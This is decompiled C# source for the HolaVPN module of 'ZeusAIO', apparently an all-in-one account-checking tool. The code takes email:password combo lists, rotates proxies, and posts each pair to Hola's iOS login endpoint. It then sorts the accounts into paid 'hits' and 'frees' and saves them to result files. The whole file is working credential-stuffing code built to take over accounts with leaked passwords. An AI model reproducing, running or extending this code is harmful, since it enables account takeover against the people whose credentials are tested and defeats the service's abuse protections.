﻿// Decompiled with JetBrains decompiler
// Type: HolaVpn.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace HolaVpn
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              string str1 = "email=" + s[0] + "&password=" + s[1];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string source = httpRequest.Post("https://client.hola.org/client_cgi/ios/login", str1, "application/x-www-form-urlencoded").ToString();
              if (source.Contains("token"))
              {
                string str2 = Check.Parse(source, "membership\":", "},\"");
                if (str2.Contains("trial\":false,\"active\":false"))
                {
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[FREE - HOLAVPN] " + s[0] + s[1], Color.OrangeRed);
                  Export.AsResult("/Holavpn_frees", s[0] + ":" + s[1]);
                  return false;
                }
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - HOLAVPN] " + s[0] + ":" + s[1] + " | Plan: " + str2, Color.Green);
                Export.AsResult("/Holavpn_hits", s[0] + ":" + s[1] + " | Plan: " + str2);
                return false;
              }
              if (source.Contains("Precondition Failed"))
              {
                ++mainmenu.frees;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[FREE - HOLAVPN] " + s[0] + s[1], Color.Green);
                Export.AsResult("/Holavpn_frees", s[0] + ":" + s[1]);
                return false;
              }
              if (!source.Contains("Unauthorized"))
                break;
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
